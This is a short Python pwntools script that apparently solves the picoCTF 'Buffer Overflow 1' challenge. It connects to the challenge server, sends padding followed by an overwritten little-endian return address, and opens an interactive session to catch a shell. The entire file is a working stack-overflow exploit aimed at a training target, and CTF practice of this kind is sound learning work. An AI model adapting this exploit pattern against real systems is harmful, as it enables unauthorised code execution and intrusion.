#0xm0t0k0s pwn for Buffer Overflow 1

from pwn import *

address = 'saturn.picoctf.net'
port = 52055
tcpsocket = remote(address, port)

print((tcpsocket.recvuntil('\n'.encode('latin-1'))).decode('latin-1'))

payload = "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPR\xf6\x91\x04\x08\x0a"

tcpsocket.sendline(payload.encode('latin-1'))
print ('Sent: 0x' + binascii.hexlify(payload.encode('latin-1')).decode('latin-1'))

print((tcpsocket.recvline()).decode('latin-1'))
print((tcpsocket.recv()).decode('latin-1'))

#To catch a shell 
tcpsocket.interactive()
